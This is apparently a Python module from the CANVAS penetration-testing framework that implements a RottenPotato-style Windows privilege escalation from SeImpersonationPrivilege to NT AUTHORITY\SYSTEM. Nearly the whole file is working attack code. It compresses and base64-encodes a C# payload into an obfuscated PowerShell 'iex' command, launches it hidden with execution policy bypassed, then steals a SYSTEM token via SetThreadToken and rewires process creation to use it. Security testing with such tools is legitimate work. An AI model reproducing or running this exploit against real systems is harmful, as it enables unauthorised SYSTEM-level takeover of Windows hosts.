#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2015
#http://www.immunityinc.com/CANVAS/ for more information

import sys
if "." not in sys.path:
    sys.path.append(".")

import os, getopt, string
import re
import socket
import locale
from tempfile import NamedTemporaryFile
from exploitutils import *
from libs.node_utils import to_node_with_token
from libs.node_utils import update_graph_node

from libs.canvasos import canvasos
import canvaserror

import base64
import zlib

from canvasexploit import canvasexploit
from ExploitTypes.localcommand import LocalCommand
import logging
import canvasengine

NAME                            = "seimpersonatepriv_lpe"
DESCRIPTION                     = "Get an NT AUTHORITY\\SYSTEM node when the current user has SeImpersonationPrivilege enabled"
VERSION                         = "1.0"

DOCUMENTATION                   = {}
DOCUMENTATION["Commandline"]    = "runmodule seimpersonatepriv_lpe"
DOCUMENTATION['CVE Name']       = 'NO-CVE'
DOCUMENTATION["References"]     = ["https://github.com/breenmachine/RottenPotatoNG",
                                   "https://github.com/foxglovesec/RottenPotato",
                                   "https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/"]

PROPERTY                        = {}
PROPERTY['TYPE']                = "Exploit"
PROPERTY['SITE']                = "Local"
PROPERTY['ARCH']                = [ ["Windows"] ]

DOCUMENTATION["Notes"]          = """
NOTE: the user running this must have SeImpersonationPrivilege. This is
the case in most IIS AppPool configurations.

Platforms Tested:
- Windows 10 x64 (full updates as of 5/4/2018) as Administrator and IIS AppPool user

"""


class theexploit(LocalCommand):
    def __init__(self):
        LocalCommand.__init__(self)
        self.use_local_interface = False
        self.module_path = os.path.dirname(__file__)
        self.remote_paths = []
        self.node = None
        self.token_system = 0

    def getargs(self):
        pass

    def get_temp_path(self, shell, inside_iis=False):
        if inside_iis:
            output = shell.runcommand("powershell $([System.Runtime.InteropServices.RuntimeEnvironment]::GetRuntimeDirectory())").lstrip().rstrip() + "Temporary ASP.NET Files\\"
        else:
            output = shell.GetTempPathA()

        logging.info("[get_temp_path] " + output)
        return output

    def make_encoded_command(self, node_ps):
        compressed_content = zlib.compress(node_ps)
        # remove header and footer of the compressed package
        rawchunk = compressed_content[2:-4]
        enc_chunk = base64.b64encode(rawchunk)
        command = "sal x New-Object;iex(x IO.StreamReader((x IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String('%s'),[IO.Compression.CompressionMode]::Decompress)),[Text.Encoding]::ASCII)).ReadToEnd()" % enc_chunk

        return command

    def run(self):
        self.getargs()

        potato_cs = None
        with open(os.path.join(self.module_path, "Resources", "potato.cs"), "rb") as handle:
            potato_cs = handle.read()
        potato_cs = "$source = @\"\r\n%s\r\n\"@; add-type -ignorewarnings -typedefinition $source; [Program]::Main()" % potato_cs

        self.setInfo("%s (in progress)" % (NAME))

        delta = float(100.0 / len(self.argsDict["passednodes"]))
        progress = 0
        self.setProgress(progress)
        return_value = 0

        for node in self.argsDict["passednodes"]:
            if node.nodetype.lower() in ["win64node", "win32node"]:
                # random port to prevent the exploit from going into a loop where port is in use
                server_port = random.randint(10000, 65534)
                logging.debug("Server random port: {}".format(server_port))
                pid_node = node.shell.getpid()
                node_ps = potato_cs.replace("SERVER_PORT", str(server_port)).replace("PID_NODE", str(pid_node))
                logging.debug("SOURCE: " + str(node_ps))
                encoded_ps = self.make_encoded_command(node_ps)
                # Payload in the powershell exploit is duplicating a SYSTEM_TOKEN into our process
                # and once we have that we can call SetThreadToken() to replace it in the current Thread.
                node.shell.CreateProcessA("powershell -executionpolicy bypass \"%s\"" % encoded_ps, dwCreationFlags = 0x08000000)
                # check 30 times/seconds
                for i in range(30):
                    ret = False
                    # check all token handles in our node
                    for handle, username in node.shell.getthreadsinfo():
                        # check if it's a SYSTEM_TOKEN
                        if username[-1] == '$':
                            # Many functions (CreateFile, FindFirstFile, ...) will use the current Thread token
                            # privileges, so the first action when our node has the SYSTEM_TOKEN is to call
                            # SetThreadToken(0, handle_system_token) (0 will replace the token in our current thread)
                            node.shell.SetThreadToken(handle)
                            # recheck if our node is running like SYSTEM
                            whoami = node.shell.whoami()
                            if whoami[-1] == '$':
                                # Now with this token the node process must call CreateProcessWithTokenW to create
                                # new processes with SYSTEM privileges, which means we need to replace this functionality in the
                                # node object.
                                # The helper to_node_with_token() will transparently replace the methods in the node object that make
                                # use of CreateProcess, internally these methods will make use of CreateProcessWithToken in order
                                # to avoid breaking things
                                self.node = to_node_with_token(node, handle)
                                update_graph_node(node, self.engine, whoami)  # update new user in the node graph
                                logging.info("TOKEN acquired correctly (Token system handle: {})".format(handle))
                                ret = True
                                break
                    if ret:
                        return_value += 1
                        break

                    time.sleep(1.0)

                progress += delta
                self.setProgress(progress)

            else:
                logging.warning("Node (%s) not supported" % str(node))

        if return_value == 0:
            self.setInfo("%s - done (failed)" % NAME)
        else:
            self.setInfo("%s - done (success)" % NAME)
        self.setProgress(100)

        return return_value > 0


if __name__ == '__main__':
    logging.info("Running CANVAS %s Exploit v %s" % (DESCRIPTION, VERSION))
    app = theexploit()
    ret = standard_callback_commandline(app)
